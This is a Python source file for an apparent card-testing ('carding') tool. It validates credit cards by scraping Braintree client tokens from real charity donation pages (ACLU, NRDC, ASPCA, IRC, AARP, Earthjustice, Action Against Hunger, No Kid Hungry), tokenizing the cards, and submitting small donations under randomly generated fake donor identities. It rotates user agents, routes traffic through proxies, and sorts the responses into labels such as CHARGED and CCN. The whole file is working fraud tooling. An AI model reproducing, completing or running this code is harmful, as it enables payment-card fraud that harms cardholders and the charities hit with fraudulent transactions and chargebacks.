"""
Braintree Donation Site Checkers
Supports: ACLU, NRDC, ASPCA, IRC/Rescue.org, Earthjustice, Action Against Hunger, No Kid Hungry
Uses direct HTTP requests (aiohttp) - NO browser automation
Full workflow: Load page -> Extract token -> Tokenize card -> Submit donation form
"""

import asyncio
import aiohttp
import random
import string
import re
import base64
import json
from fake_useragent import UserAgent
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import time
from bin_info import bin_block_from_braintree, fetch_bin_info, format_bin_block

class BraintreeResultClassifier:
    """
    Classify Braintree errors based on official error codes
    Reference: https://braintree.github.io/braintree-web/current/BraintreeError.html
    """
    
    @staticmethod
    def classify(error_text, response_text=""):
        if not error_text:
            error_text = ""
        if not response_text:
            response_text = ""
            
        error_lower = error_text.lower()
        response_lower = response_text.lower()
        combined = f"{error_lower} {response_lower}"
        
        if any(x in combined for x in ['success', 'thank you', 'donation complete', 'payment successful', 'transaction approved']):
            return "CHARGED", error_text or "Payment Successful"
        
        if 'duplicate' in combined or 'already' in combined:
            return "APPROVED", "Duplicate Transaction"
            
        if any(x in combined for x in ['cvv', 'cvc', 'security code', 'card code']):
            if 'incorrect' in combined or 'invalid' in combined or 'declined' in combined or 'mismatch' in combined:
                return "CCN", "CVV Declined"
        
        if any(x in combined for x in ['insufficient', 'not enough', 'low balance', 'nsf', 'balance']):
            return "INSUFFICIENT", "Insufficient Funds"
        
        if any(x in combined for x in ['3ds', '3-d secure', 'authentication', 'challenge', 'action required']):
            return "APPROVED", "3DS Required"
        
        if any(x in combined for x in ['expired', 'expiration', 'expiry']):
            return "DECLINED", "Expired Card"
        
        if any(x in combined for x in ['invalid card', 'card number is invalid', 'invalid credit card']):
            return "DECLINED", "Invalid Card Number"
        
        if any(x in combined for x in ['processor declined', 'do not honor', '2000 : do not honor']):
            return "DECLINED", "Processor Declined"
        
        if 'card type is not accepted' in combined or 'card type not supported' in combined:
            return "DECLINED", "Card Type Not Accepted"
        
        if any(x in combined for x in ['risk', 'fraud', 'suspicious']):
            return "DECLINED", "Risk Declined"
        
        if 'gateway rejected' in combined:
            if 'cvv' in combined:
                return "CCN", "CVV Declined"
            if 'avs' in combined:
                return "DECLINED", "AVS Failed"
            return "DECLINED", "Gateway Rejected"
        
        if 'credit card is invalid' in combined:
            return "DECLINED", "Invalid Card"
        
        if 'transaction failed' in combined or 'payment failed' in combined:
            return "DECLINED", "Transaction Failed"
        
        if 'declined' in combined:
            return "DECLINED", error_text or "Declined"
        
        return "ERROR", error_text or "Unknown Error"


class BraintreeDonationChecker:
    """Base class for Braintree donation site checkers"""
    
    def __init__(self):
        self.ua = UserAgent()
        self.classifier = BraintreeResultClassifier()
    
    def generate_random_data(self):
        first_names = ["John", "Jane", "Michael", "Sarah", "David", "Emily", "Robert", "Lisa",
                       "James", "Mary", "William", "Patricia", "Richard", "Jennifer", "Thomas"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
                      "Rodriguez", "Martinez", "Anderson", "Taylor", "Thomas", "Moore", "Jackson"]
        streets = ["Main", "Oak", "Maple", "Cedar", "Elm", "Pine", "Park", "Lake", "Hill", "River"]
        cities_states = [
            ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"),
            ("Houston", "TX", "77001"), ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"),
            ("San Antonio", "TX", "78201"), ("San Diego", "CA", "92101"), ("Dallas", "TX", "75201"),
            ("Denver", "CO", "80201"), ("Seattle", "WA", "98101"), ("Boston", "MA", "02101"),
        ]
        city, state, zipcode = random.choice(cities_states)
        
        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(10,99)}@gmail.com",
            "phone": f"{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}",
            "address": f"{random.randint(100, 9999)} {random.choice(streets)} St",
            "city": city,
            "state": state,
            "zip": zipcode,
            "country": "US",
        }
    
    def get_user_agent(self):
        return self.ua.random

    async def _print_bin_fallback(self, session, cc):
        try:
            info = await fetch_bin_info(cc[:6], session=session)
            if info and not info.get("_error") and any(v for k, v in info.items() if k != "_error" and v):
                brand = info.get("scheme") or info.get("brand") or "?"
                funding = info.get("type") or "?"
                country = info.get("country_alpha2") or "?"
                bank = info.get("bank_name") or None
                product_type = info.get("product_type") or ""
                three_ds = product_type if product_type else "unknown"
                blk = format_bin_block(brand=brand, funding=funding, country=country,
                                       three_ds=three_ds, checks="all None", bank=bank)
                print(blk, flush=True)
        except Exception:
            pass

    async def tokenize_card_braintree(self, session, authorization, cc, mes, ano, cvv):
        try:
            headers = {
                'authorization': f'Bearer {authorization}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': self.get_user_agent(),
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': ''.join(random.choices(string.ascii_letters + string.digits, k=36))
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes.zfill(2),
                            'expirationYear': ano if len(ano) == 4 else f"20{ano}",
                            'cvv': cvv,
                        },
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            async with session.post('https://payments.braintree-api.com/graphql', 
                                   headers=headers, json=json_data, timeout=30) as resp:
                data = await resp.json()
                if 'data' in data and 'tokenizeCreditCard' in data['data']:
                    tokenize_result = data['data']['tokenizeCreditCard']
                    token = tokenize_result['token']
                    credit_card = tokenize_result.get('creditCard', {}) or {}
                    bin_data = credit_card.get('binData', {}) or {}
                    return token, None, credit_card, bin_data
                else:
                    errors = data.get('errors', [])
                    err_msg = errors[0].get('message', 'Tokenization failed') if errors else 'Tokenization failed'
                    return None, err_msg, {}, {}
        except Exception as e:
            return None, f"Tokenization error: {str(e)}", {}, {}

    async def extract_springboard_form(self, session, url, label):
        print(f"[{label}] Loading donation page...", flush=True)
        async with session.get(url, timeout=30) as resp:
            if resp.status != 200:
                return None, None, None, None, f"Page load failed: {resp.status}"
            html = await resp.text()
            final_url = str(resp.url)
        
        form_build_id = re.search(r'name="form_build_id"\s+value="([^"]+)"', html)
        form_id = re.search(r'name="form_id"\s+value="([^"]+)"', html)
        form_token = re.search(r'name="form_token"\s+value="([^"]+)"', html)
        
        if not form_build_id:
            return None, None, None, html, "form_build_id not found"
        
        form_data = {
            'form_build_id': form_build_id.group(1),
            'form_id': form_id.group(1) if form_id else '',
        }
        if form_token:
            form_data['form_token'] = form_token.group(1)
        
        hiddens = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        hiddens += re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="hidden"[^>]*value="([^"]*)"', html)
        for name, val in hiddens:
            if name not in form_data:
                form_data[name] = val
        
        bt_auth = re.search(r'(production_[a-z0-9]+_[a-z0-9]+)', html)
        bt_token = bt_auth.group(1) if bt_auth else None
        
        if not bt_token:
            for eyj_match in re.finditer(r'["\']?(eyJ[A-Za-z0-9+/=]{50,})["\']?', html):
                try:
                    decoded = base64.b64decode(eyj_match.group(1) + "==").decode('utf-8', errors='ignore')
                    if 'braintree' in decoded.lower() or 'authorizationFingerprint' in decoded:
                        auth_fp = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                        if auth_fp:
                            bt_token = auth_fp.group(1)
                            break
                except:
                    pass
        
        if not bt_token:
            return None, None, None, html, "Braintree token not found"
        
        print(f"[{label}] Extracted BT token + form data", flush=True)
        return bt_token, form_data, final_url, html, None


class SpringboardDonationChecker(BraintreeDonationChecker):
    """Full-workflow checker for Springboard donation platforms (ACLU, NRDC, ASPCA, IRC)"""

    SITE_NAME = "SPRINGBOARD"
    DONATE_URL = ""
    FORM_ACTION_PATH = ""
    AMOUNT = "5"
    
    async def check_card(self, cc, mes, ano, cvv, proxy=None):
        card_display = f"{cc}|{mes}|{ano}|{cvv}"
        label = self.SITE_NAME
        print(f"[{label}] Checking: {card_display}", flush=True)
        
        try:
            user_data = self.generate_random_data()
            headers = {
                'User-Agent': self.get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            connector = None
            if proxy:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            
            timeout = aiohttp.ClientTimeout(total=60)
            jar = aiohttp.CookieJar()
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers, cookie_jar=jar) as session:
                bt_token, form_data, final_url, html, error = await self.extract_springboard_form(
                    session, self.DONATE_URL, label
                )
                
                if error:
                    await self._print_bin_fallback(session, cc)
                    return self.classifier.classify(error)
                
                nonce, tok_error, credit_card, bin_data = await self.tokenize_card_braintree(
                    session, bt_token, cc, mes, ano, cvv
                )
                
                if not nonce:
                    await self._print_bin_fallback(session, cc)
                    return self.classifier.classify(tok_error or "Card tokenization failed")
                
                print(f"[{label}] Card tokenized: {nonce[:20]}...", flush=True)
                bin_block = await bin_block_from_braintree(credit_card, bin_data, cc=cc, session=session)
                print(bin_block, flush=True)
                
                submit_data = self.build_submit_data(form_data, user_data, nonce, cc, mes, ano, cvv, credit_card)
                
                form_action = self.FORM_ACTION_PATH or final_url
                if not form_action.startswith('http'):
                    parsed = urlparse(final_url)
                    form_action = f"{parsed.scheme}://{parsed.netloc}{form_action}"
                
                submit_headers = {
                    'User-Agent': self.get_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': f"{urlparse(final_url).scheme}://{urlparse(final_url).netloc}",
                    'Referer': final_url,
                }
                
                print(f"[{label}] Submitting donation form...", flush=True)
                
                async with session.post(form_action, data=submit_data, headers=submit_headers,
                                       allow_redirects=True, timeout=30) as resp:
                    resp_text = await resp.text()
                    resp_status = resp.status
                    resp_url = str(resp.url)
                
                print(f"[{label}] Response: {resp_status} -> {resp_url[:80]}", flush=True)
                
                result_text = self.parse_response(resp_text, resp_url, resp_status)
                if 'maintenance' in result_text.lower() or 'server error' in result_text.lower():
                    return "ERROR", result_text
                return self.classifier.classify(result_text, resp_text[:2000])
        
        except Exception as e:
            error_msg = str(e)
            print(f"[{label}] Error: {error_msg}", flush=True)
            return self.classifier.classify(error_msg)
    
    def build_submit_data(self, form_data, user_data, nonce, cc, mes, ano, cvv, credit_card):
        brand_code = credit_card.get('brandCode', 'visa') or 'visa'
        last4 = credit_card.get('last4', cc[-4:]) or cc[-4:]
        
        submit = dict(form_data)
        
        submit['payment_method_nonce'] = nonce
        submit['submitted[donor_information][first_name]'] = user_data['first_name']
        submit['submitted[donor_information][last_name]'] = user_data['last_name']
        submit['submitted[donor_information][mail]'] = user_data['email']
        submit['submitted[billing_information][address]'] = user_data['address']
        submit['submitted[billing_information][address_line_2]'] = ''
        submit['submitted[billing_information][city]'] = user_data['city']
        submit['submitted[billing_information][state]'] = user_data['state']
        submit['submitted[billing_information][zip]'] = user_data['zip']
        submit['submitted[billing_information][country]'] = 'US'
        submit['submitted[donation][recurs_monthly]'] = 'no_recurr'
        submit['submitted[donation][amount]'] = self.AMOUNT
        submit['submitted[donation][other_amount]'] = ''
        submit['submitted[payment_information][payment_fields][credit][card_number]'] = ''
        submit['submitted[payment_information][payment_fields][credit][expiration_date]'] = ''
        submit['submitted[payment_information][payment_fields][credit][card_cvv]'] = ''
        submit['submitted[payment_information][payment_fields][credit][braintree_card_type]'] = brand_code.upper()
        submit['submitted[payment_information][payment_fields][credit][braintree_last4]'] = last4
        submit['submitted[extra_fields][payment_options]'] = 'credit'
        
        return submit
    
    def parse_response(self, html, url, status):
        text_lower = html.lower()

        if 'maintenance' in text_lower or 'upgrade in progress' in text_lower or 'temporarily unavailable' in text_lower:
            return "Site under maintenance - retry later"
        if status >= 500:
            return f"Server error (HTTP {status})"

        error_msgs = re.findall(r'class="[^"]*(?:error|alert|messages--error|form-error)[^"]*"[^>]*>(.*?)</(?:div|span|li)', html, re.DOTALL | re.I)
        if error_msgs:
            cleaned = re.sub(r'<[^>]+>', '', error_msgs[0]).strip()
            if cleaned:
                return cleaned

        error_msg2 = re.search(r'<div[^>]*class="[^"]*messages[^"]*error[^"]*"[^>]*>(.*?)</div>', html, re.DOTALL | re.I)
        if error_msg2:
            cleaned = re.sub(r'<[^>]+>', '', error_msg2.group(1)).strip()
            if cleaned:
                return cleaned

        if 'confirmation' in url.lower() or 'thank-you' in url.lower():
            return "Payment Successful - Confirmation page"

        if status == 200 and 'thank you' in text_lower and ('donation' in text_lower or 'gift' in text_lower):
            return "Thank you for your donation"

        if any(x in text_lower for x in ['processor declined', 'do not honor', 'transaction failed']):
            decline_match = re.search(r'(processor declined[^<]*|do not honor[^<]*|transaction failed[^<]*)', html, re.I)
            return decline_match.group(1).strip() if decline_match else "Processor Declined"

        if any(x in text_lower for x in ['invalid card', 'card number', 'cvv', 'expired']):
            card_err = re.search(r'(invalid card[^<]*|card number[^<]*invalid[^<]*|cvv[^<]*|expired[^<]*)', html, re.I)
            return card_err.group(1).strip() if card_err else "Card Error"

        if status >= 400:
            return f"HTTP {status}"

        return "Unknown response"


class ACLUChecker(SpringboardDonationChecker):
    SITE_NAME = "ACLU"
    DONATE_URL = "https://action.aclu.org/give/now"
    AMOUNT = "5"
    
    def build_submit_data(self, form_data, user_data, nonce, cc, mes, ano, cvv, credit_card):
        submit = super().build_submit_data(form_data, user_data, nonce, cc, mes, ano, cvv, credit_card)
        submit['submitted[cid]'] = form_data.get('submitted[cid]', '7013r000001oYcPAAU')
        submit['submitted[primary_email_list]'] = 'MemberNational'
        submit['op'] = 'Submit'
        return submit


class NRDCChecker(SpringboardDonationChecker):
    SITE_NAME = "NRDC"
    DONATE_URL = "https://action.nrdc.org/donation/855-support-nrdc"
    FORM_ACTION_PATH = "/donation/855-support-nrdc"
    AMOUNT = "5"
    
    def build_submit_data(self, form_data, user_data, nonce, cc, mes, ano, cvv, credit_card):
        submit = super().build_submit_data(form_data, user_data, nonce, cc, mes, ano, cvv, credit_card)
        submit['submitted[initms]'] = form_data.get('submitted[initms]', 'EONEDON')
        submit['submitted[ms]'] = form_data.get('submitted[ms]', 'EONEDON')
        submit['op'] = 'Submit'
        return submit


class ASPCAChecker(SpringboardDonationChecker):
    SITE_NAME = "ASPCA"
    DONATE_URL = "https://secure.aspca.org/donate/donate"
    AMOUNT = "5"
    
    def build_submit_data(self, form_data, user_data, nonce, cc, mes, ano, cvv, credit_card):
        submit = super().build_submit_data(form_data, user_data, nonce, cc, mes, ano, cvv, credit_card)
        submit['submitted[donation_type]'] = 'one_time'
        submit['op'] = 'Submit'
        return submit


class IRCRescueChecker(SpringboardDonationChecker):
    SITE_NAME = "IRC"
    DONATE_URL = "https://help.rescue.org/donate"
    AMOUNT = "5"
    
    def build_submit_data(self, form_data, user_data, nonce, cc, mes, ano, cvv, credit_card):
        submit = super().build_submit_data(form_data, user_data, nonce, cc, mes, ano, cvv, credit_card)
        submit['op'] = 'Submit'
        return submit


class AARPChecker(SpringboardDonationChecker):
    SITE_NAME = "AARP"
    DONATE_URL = "https://action.aarp.org/site/Donation/donate-today"
    FORM_ACTION_PATH = "/site/Donation/donate-today"
    AMOUNT = "25"

    def build_submit_data(self, form_data, user_data, nonce, cc, mes, ano, cvv, credit_card):
        submit = super().build_submit_data(form_data, user_data, nonce, cc, mes, ano, cvv, credit_card)
        submit['submitted[cid]'] = form_data.get('submitted[cid]', '7013i000000Dz0QAAS')
        submit['submitted[donation_type]'] = 'Donation'
        submit['submitted[emailsrc]'] = 'FDN'
        submit['submitted[sc]'] = form_data.get('submitted[sc]', 'OWG201XXXX')
        submit['submitted[payment_information][payment_method]'] = 'credit'
        submit['submitted[payment_information][payment_fields][credit][account_name][credit]'] = 'AARP FOUNDATION'
        submit['submitted[mail]'] = user_data['email']
        submit['submitted[gs_flag]'] = '0'
        submit['submitted[secure_prepop_autofilled]'] = '0'
        submit['submitted[springboard_cookie_autofilled]'] = 'disabled'
        submit['op'] = 'Donate'
        return submit


class EarthjusticeChecker(BraintreeDonationChecker):
    """Checker for act.earthjustice.org (legacy - may be down)"""
    
    async def check_card(self, cc, mes, ano, cvv, proxy=None):
        card_display = f"{cc}|{mes}|{ano}|{cvv}"
        print(f"[EARTHJUSTICE] Checking: {card_display}", flush=True)
        
        try:
            headers = {
                'User-Agent': self.get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            connector = None
            if proxy:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            
            timeout = aiohttp.ClientTimeout(total=60)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
                donation_url = 'https://act.earthjustice.org/a/donate'
                print(f"[EARTHJUSTICE] Loading donation page...", flush=True)
                
                async with session.get(donation_url) as resp:
                    if resp.status != 200:
                        return self.classifier.classify(f"Page load failed: {resp.status}")
                    page_html = await resp.text()
                
                soup = BeautifulSoup(page_html, 'html.parser')
                token_match = (
                    re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', page_html) or
                    re.search(r'client_token["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', page_html) or
                    re.search(r'data-braintree[^>]*token["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html)
                )
                
                if not token_match:
                    scripts = soup.find_all('script')
                    for script in scripts:
                        script_content = script.string or ''
                        token_match = re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', script_content)
                        if token_match:
                            break
                
                if not token_match:
                    return self.classifier.classify("Braintree token not found on page")
                
                client_token_encoded = token_match.group(1)
                print(f"[EARTHJUSTICE] Extracted Braintree token", flush=True)
                
                try:
                    decoded = base64.b64decode(client_token_encoded).decode('utf-8')
                    auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                    if not auth_match:
                        return self.classifier.classify("Authorization not found in token")
                    authorization = auth_match.group(1)
                except Exception as e:
                    return self.classifier.classify(f"Token decode failed: {str(e)}")
                
                nonce, error, credit_card, bin_data = await self.tokenize_card_braintree(session, authorization, cc, mes, ano, cvv)
                
                if not nonce:
                    await self._print_bin_fallback(session, cc)
                    return self.classifier.classify(error or "Card tokenization failed")
                
                print(f"[EARTHJUSTICE] Card tokenized successfully: {nonce[:20]}...", flush=True)
                bin_block = await bin_block_from_braintree(credit_card, bin_data, cc=cc, session=session)
                print(bin_block, flush=True)
                return self.classifier.classify("", "Card tokenized successfully")
        
        except Exception as e:
            error_msg = str(e)
            print(f"[EARTHJUSTICE] Error: {error_msg}", flush=True)
            return self.classifier.classify(error_msg)


class ActionAgainstHungerChecker(BraintreeDonationChecker):
    """Checker for actionagainsthunger.org (legacy - may be down)"""
    
    async def check_card(self, cc, mes, ano, cvv, proxy=None):
        card_display = f"{cc}|{mes}|{ano}|{cvv}"
        print(f"[ACTION_HUNGER] Checking: {card_display}", flush=True)
        
        try:
            headers = {
                'User-Agent': self.get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            connector = None
            if proxy:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            
            timeout = aiohttp.ClientTimeout(total=60)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
                donation_url = 'https://www.actionagainsthunger.org/take-action/give-monthly-thrive/'
                print(f"[ACTION_HUNGER] Loading donation page...", flush=True)
                
                async with session.get(donation_url) as resp:
                    if resp.status != 200:
                        return self.classifier.classify(f"Page load failed: {resp.status}")
                    page_html = await resp.text()
                
                soup = BeautifulSoup(page_html, 'html.parser')
                token_match = (
                    re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', page_html) or
                    re.search(r'client_token["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', page_html) or
                    re.search(r'braintree.*?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
                )
                
                if not token_match:
                    scripts = soup.find_all('script')
                    for script in scripts:
                        script_content = script.string or ''
                        token_match = re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', script_content)
                        if token_match:
                            break
                
                if not token_match:
                    return self.classifier.classify("Braintree token not found")
                
                client_token_encoded = token_match.group(1)
                print(f"[ACTION_HUNGER] Extracted Braintree token", flush=True)
                
                try:
                    decoded = base64.b64decode(client_token_encoded).decode('utf-8')
                    auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                    if not auth_match:
                        return self.classifier.classify("Authorization not found")
                    authorization = auth_match.group(1)
                except Exception as e:
                    return self.classifier.classify(f"Token decode error: {str(e)}")
                
                nonce, error, credit_card, bin_data = await self.tokenize_card_braintree(session, authorization, cc, mes, ano, cvv)
                
                if not nonce:
                    await self._print_bin_fallback(session, cc)
                    return self.classifier.classify(error or "Tokenization failed")
                
                print(f"[ACTION_HUNGER] Card tokenized successfully", flush=True)
                bin_block = await bin_block_from_braintree(credit_card, bin_data, cc=cc, session=session)
                print(bin_block, flush=True)
                return self.classifier.classify("", "Card tokenized successfully")
        
        except Exception as e:
            error_msg = str(e)
            print(f"[ACTION_HUNGER] Error: {error_msg}", flush=True)
            return self.classifier.classify(error_msg)


class NoKidHungryChecker(BraintreeDonationChecker):
    """Checker for secure.nokidhungry.org (legacy - may be down)"""
    
    async def check_card(self, cc, mes, ano, cvv, proxy=None):
        card_display = f"{cc}|{mes}|{ano}|{cvv}"
        print(f"[NO_KID_HUNGRY] Checking: {card_display}", flush=True)
        
        try:
            headers = {
                'User-Agent': self.get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            connector = None
            if proxy:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            
            timeout = aiohttp.ClientTimeout(total=60)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
                donation_url = 'https://secure.nokidhungry.org/site/Donation2?df_id=22406&22406.donation=form1'
                print(f"[NO_KID_HUNGRY] Loading donation page...", flush=True)
                
                async with session.get(donation_url) as resp:
                    if resp.status != 200:
                        return self.classifier.classify(f"Page load failed: {resp.status}")
                    page_html = await resp.text()
                
                soup = BeautifulSoup(page_html, 'html.parser')
                token_match = (
                    re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', page_html) or
                    re.search(r'client_token["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', page_html) or
                    re.search(r'data-braintree-client-token["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html)
                )
                
                if not token_match:
                    scripts = soup.find_all('script')
                    for script in scripts:
                        script_content = script.string or ''
                        token_match = re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']{100,})["\']', script_content)
                        if token_match:
                            break
                
                if not token_match:
                    return self.classifier.classify("Braintree token not found")
                
                client_token_encoded = token_match.group(1)
                print(f"[NO_KID_HUNGRY] Extracted Braintree token", flush=True)
                
                try:
                    decoded = base64.b64decode(client_token_encoded).decode('utf-8')
                    auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                    if not auth_match:
                        return self.classifier.classify("Authorization fingerprint not found")
                    authorization = auth_match.group(1)
                except Exception as e:
                    return self.classifier.classify(f"Token decode failed: {str(e)}")
                
                nonce, error, credit_card, bin_data = await self.tokenize_card_braintree(session, authorization, cc, mes, ano, cvv)
                
                if not nonce:
                    await self._print_bin_fallback(session, cc)
                    return self.classifier.classify(error or "Card tokenization failed")
                
                print(f"[NO_KID_HUNGRY] Card tokenized successfully", flush=True)
                bin_block = await bin_block_from_braintree(credit_card, bin_data, cc=cc, session=session)
                print(bin_block, flush=True)
                return self.classifier.classify("", "Card tokenized successfully")
        
        except Exception as e:
            error_msg = str(e)
            print(f"[NO_KID_HUNGRY] Error: {error_msg}", flush=True)
            return self.classifier.classify(error_msg)
